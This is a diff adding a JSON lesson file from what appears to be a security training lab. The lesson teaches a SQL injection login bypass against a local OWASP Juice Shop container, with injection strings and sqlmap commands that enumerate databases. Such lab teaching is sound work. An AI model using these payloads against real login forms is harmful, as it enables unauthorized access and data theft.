@@ -1,0 +1,62 @@
+{
+  "id": "juiceshop-sqli",
+  "name": "Juice Shop: SQL Injection Login Bypass",
+  "difficulty": "easy",
+  "container": "juiceshop",
+  "ip": "172.20.0.30",
+  "port": 3000,
+  "short_description": "Bypass authentication in OWASP Juice Shop using SQL injection.",
+  "description": "OWASP Juice Shop is a modern web application with 100+ security challenges. This lesson covers the classic SQL injection login bypass - one of the first challenges. You'll learn how improper input sanitization leads to authentication bypass.",
+  "steps": [
+    {
+      "title": "Open Juice Shop",
+      "command": "Open http://localhost:3000 in your browser",
+      "explanation": "Juice Shop is a Node.js e-commerce application with intentional vulnerabilities."
+    },
+    {
+      "title": "Find the login page",
+      "command": "Click 'Account' -> 'Login' in the top right",
+      "explanation": "Navigate to the login form."
+    },
+    {
+      "title": "Test for SQL injection",
+      "command": "Email: ' OR 1=1--\nPassword: anything",
+      "explanation": "The single quote breaks the SQL query. 'OR 1=1' is always true. '--' comments out the rest.",
+      "expected": "Login fails but you might see an error revealing SQL is being used"
+    },
+    {
+      "title": "Bypass login as admin",
+      "command": "Email: admin@juice-sh.op'--\nPassword: anything",
+      "explanation": "We're saying 'log me in as admin@juice-sh.op and ignore everything after'. The comment (--) skips password check.",
+      "expected": "You're logged in as admin!"
+    },
+    {
+      "title": "Alternative: Use any email format",
+      "command": "Email: ' OR 1=1--\nPassword: x",
+      "explanation": "This bypasses as the first user in the database (usually admin).",
+      "expected": "Logged in as admin"
+    },
+    {
+      "title": "View the scoreboard",
+      "command": "Navigate to http://localhost:3000/#/score-board",
+      "explanation": "Juice Shop tracks your progress. Check how many challenges you've solved."
+    },
+    {
+      "title": "Use SQLMap for automated testing",
+      "command": "sqlmap -u 'http://172.20.0.30:3000/rest/user/login' --data='email=test&password=test' --batch",
+      "explanation": "SQLMap can automatically detect and exploit SQL injection. Run this from Kali."
+    },
+    {
+      "title": "Extract database info with SQLMap",
+      "command": "sqlmap -u 'http://172.20.0.30:3000/rest/user/login' --data='email=test&password=test' --dbs --batch",
+      "explanation": "List all databases.",
+      "expected": "SQLite database detected"
+    }
+  ],
+  "success_criteria": "You logged in as admin without knowing the password. Check the Juice Shop scoreboard for credit.",
+  "next_steps": [
+    "Try other Juice Shop challenges: XSS, broken access control, insecure deserialization",
+    "Explore /api endpoints for more vulnerabilities",
+    "Try to access admin section at /administration"
+  ]
+}
